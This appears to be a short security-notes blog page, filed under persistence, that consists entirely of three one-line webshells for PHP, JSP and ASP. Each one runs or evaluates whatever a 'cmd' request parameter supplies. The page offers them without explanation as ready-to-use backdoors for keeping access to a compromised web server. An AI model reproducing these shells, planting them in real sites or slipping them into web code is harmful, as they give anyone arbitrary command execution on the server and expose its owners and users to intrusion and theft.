---
description: >-
  Webshells
title: WebShells              # Add title here
date: 2023-12-26 08:00:00 -0600                           # Change the date to match completion date
categories: [07 Persistence, Webshells]                     # Change Templates to Writeup
tags: [persistence, webshell]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### PHP WEBSHELL
```php
<?php system($_REQUEST["cmd"]); ?>
```
### JSP WEBSHELL
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
### ASP WEBSHELL
```asp
<% eval request("cmd") %>
```